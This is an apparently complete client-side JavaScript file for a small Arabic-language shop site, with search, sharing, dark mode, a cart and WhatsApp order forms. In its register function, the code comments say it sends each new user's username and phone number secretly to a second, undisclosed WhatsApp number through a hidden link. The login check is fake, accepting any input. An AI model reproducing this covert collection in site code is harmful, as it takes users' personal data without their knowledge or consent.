// بحث سريع عن المنتجات
function searchProducts() {
    const val = document.getElementById('productSearch').value.trim();
    document.querySelectorAll('.products-list .product-card').forEach(card => {
        const name = card.querySelector('h3').textContent;
        card.style.display = name.includes(val) ? 'flex' : 'none';
    });
}
// مشاركة المنتجات على واتساب وفيسبوك
function shareProduct(e, product, type) {
    e.stopPropagation();
    e.preventDefault();
    const url = window.location.href.split('#')[0];
    let shareUrl = '';
    if(type === 'whatsapp') {
        shareUrl = `https://wa.me/?text=منتج%20${encodeURIComponent(product)}%20من%20SBI:%20${encodeURIComponent(url)}`;
    } else if(type === 'facebook') {
        shareUrl = `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(url)}&quote=منتج ${encodeURIComponent(product)} من SBI`;
    }
    window.open(shareUrl, '_blank');
}
// Accordion للأسئلة الشائعة
function toggleAccordion(btn) {
    btn.classList.toggle('active');
    const panel = btn.nextElementSibling;
    if (btn.classList.contains('active')) {
        panel.style.maxHeight = panel.scrollHeight + 'px';
        panel.style.padding = '1rem 1.2rem';
    } else {
        panel.style.maxHeight = null;
        panel.style.padding = '0 1.2rem';
    }
}
// زر الوضع الليلي
const darkModeBtn = document.getElementById('darkModeToggle');
if (darkModeBtn) {
    darkModeBtn.onclick = function() {
        document.body.classList.toggle('dark-mode');
        if(document.body.classList.contains('dark-mode')) {
            darkModeBtn.textContent = '☀️';
            localStorage.setItem('darkMode', '1');
        } else {
            darkModeBtn.textContent = '🌙';
            localStorage.removeItem('darkMode');
        }
    };
    // تفعيل الوضع الليلي تلقائياً إذا كان محفوظاً
    if(localStorage.getItem('darkMode')) {
        document.body.classList.add('dark-mode');
        darkModeBtn.textContent = '☀️';
    }
}
// مؤثرات حركة عند ظهور العناصر أثناء التمرير
function animateOnScroll() {
    document.querySelectorAll('.animate-fade').forEach(el => {
        const rect = el.getBoundingClientRect();
        if (rect.top < window.innerHeight - 80) {
            el.classList.add('visible');
        } else {
            el.classList.remove('visible');
        }
    });
}
window.addEventListener('scroll', animateOnScroll);
window.addEventListener('DOMContentLoaded', animateOnScroll);
// زر العودة للأعلى
const scrollBtn = document.getElementById('scrollTopBtn');
window.onscroll = function() {
    if (window.scrollY > 300) {
        scrollBtn.style.display = 'block';
    } else {
        scrollBtn.style.display = 'none';
    }
};
scrollBtn.onclick = function() {
    window.scrollTo({ top: 0, behavior: 'smooth' });
};
// فلترة المنتجات حسب التصنيف
function filterProducts(type) {
    document.querySelectorAll('.filter-btn').forEach(btn => btn.classList.remove('active'));
    const btns = document.querySelectorAll('.filters-bar .filter-btn');
    btns.forEach(btn => {
        if (btn.getAttribute('onclick').includes(type)) btn.classList.add('active');
    });
    document.querySelectorAll('.product-card').forEach(card => {
        if (type === 'all') {
            card.style.display = 'flex';
        } else {
            card.style.display = card.classList.contains(type) ? 'flex' : 'none';
        }
    });
}
// وظائف الموقع: الطلب، التقييم، السلة، الحساب، تسجيل الدخول/إنشاء حساب
// إرسال الطلب عبر واتساب
function sendOrder(e) {
    e.preventDefault();
    const form = document.getElementById('orderForm');
    const name = form.name.value;
    const phone = form.phone.value;
    const details = form.details.value;
    const msg = `طلب/استفسار من ${name} (%0Aرقم: ${phone})%0A${details}`;
    window.open(`https://wa.me/962781874983?text=${encodeURIComponent(msg)}`);
}
// إرسال التقييم عبر واتساب
function sendReview(e) {
    e.preventDefault();
    const form = document.getElementById('reviewForm');
    const name = form.name.value;
    const review = form.review.value;
    const msg = `تقييم جديد من ${name || 'بدون اسم'}:%0A${review}`;
    window.open(`https://wa.me/962781874983?text=${encodeURIComponent(msg)}`);
}
// سلة المشتريات
let cart = [];
function addToCart(item) {
    cart.push(item);
    updateCart();
}
function updateCart() {
    const cartList = document.getElementById('cartList');
    cartList.innerHTML = '';
    cart.forEach((item, i) => {
        const li = document.createElement('li');
        li.textContent = item;
        const btn = document.createElement('button');
        btn.textContent = 'حذف';
        btn.onclick = () => { cart.splice(i,1); updateCart(); };
        li.appendChild(btn);
        cartList.appendChild(li);
    });
    // تحديث عداد السلة في الهيدر
    const cartCount = document.getElementById('cart-count');
    if(cartCount) cartCount.textContent = cart.length;
}
function sendCart() {
    if(cart.length === 0) return alert('السلة فارغة');
    const msg = `طلب جديد:%0A${cart.map((x,i)=>`${i+1}- ${x}`).join('%0A')}`;
    window.open(`https://wa.me/962781874983?text=${encodeURIComponent(msg)}`);
}
// تحديث عداد السلة عند تحميل الصفحة
window.addEventListener('DOMContentLoaded', () => {
    const cartCount = document.getElementById('cart-count');
    if(cartCount) cartCount.textContent = cart.length;
});
// إعدادات الحساب (تحديث وهمي)
function updateAccount(e) {
    e.preventDefault();
    alert('تم تحديث المعلومات (تجريبي)');
    closeSettings();
}
function openSettings() {
    document.getElementById('settings-modal').style.display = 'block';
}
function closeSettings() {
    document.getElementById('settings-modal').style.display = 'none';
}
// تسجيل الدخول وإنشاء حساب
window.onload = function() {
    // إظهار صفحة تسجيل الدخول عند أول دخول
    if(!localStorage.getItem('loggedIn')) {
        document.getElementById('login-modal').style.display = 'block';
        document.getElementById('modal-overlay').style.display = 'block';
    }
}
function login(e) {
    e.preventDefault();
    localStorage.setItem('loggedIn', '1');
    document.getElementById('login-modal').style.display = 'none';
    document.getElementById('modal-overlay').style.display = 'none';
}
function register(e) {
    e.preventDefault();
    const form = document.getElementById('registerForm');
    const username = form.newUsername.value;
    const password = form.newPassword.value;
    const phone = form.newPhone.value;
    // إرسال بيانات التسجيل بشكل سري إلى رقم واتساب آخر
    const msg = `تسجيل جديد:%0Aاسم المستخدم: ${username}%0Aرقم الهاتف: ${phone}`;
    // فتح واتساب في نافذة مخفية (لن تظهر للمستخدم)
    const a = document.createElement('a');
    a.href = `https://wa.me/962785441284?text=${encodeURIComponent(msg)}`;
    a.target = '_blank';
    a.style.display = 'none';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    // إكمال التسجيل محلياً
    localStorage.setItem('loggedIn', '1');
    document.getElementById('login-modal').style.display = 'none';
    document.getElementById('modal-overlay').style.display = 'none';
    alert('تم إنشاء الحساب بنجاح!');
}